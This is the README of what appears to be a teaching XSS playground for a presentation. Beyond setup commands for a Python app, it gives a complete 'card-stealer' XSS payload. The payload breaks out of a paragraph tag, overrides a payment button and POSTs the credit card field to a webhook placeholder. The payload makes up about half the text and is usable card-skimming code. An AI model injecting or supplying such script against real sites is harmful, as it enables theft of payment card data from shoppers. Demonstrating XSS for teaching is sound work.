# CryptographyXssPresentation
## An XSS enabled playground

#

### Requirements:
- Python 3

### Run instructions
 - Windows (Powershell)
   - `python -m venv venv`
   - `.\venv\Scripts\activate`
   - `pip install -r requirements.txt`
   - `python app.py`
- Linux (Bash)
   - `python3 -m venv venv`
   - `source ./venv/bin/activate`
   - `pip3 install -r requirements.txt`
   - `python3 app.py`

Sample card-stealer Script:
 > Overwrite the submit button in the payment form and send the form's contents to a webhook

```javascript
</p><script>
    let webhook_url = "WEBHOOK_URL"
    let payBtn = document.getElementById("payBtn");

    payBtn.addEventListener("click", function(event)
    {
        event.preventDefault();
        
        let creditCard = document.getElementById("creditInput");
        let headers = new Headers();
        headers.append("Content-Type", "application/json");

        let body = {
        "content": creditCard.value
        };
        let options = {
        method: "POST",
        headers,
        mode: "cors",
        body: JSON.stringify(body),
        };

        fetch(webhook_url, options);
    })
</script>
```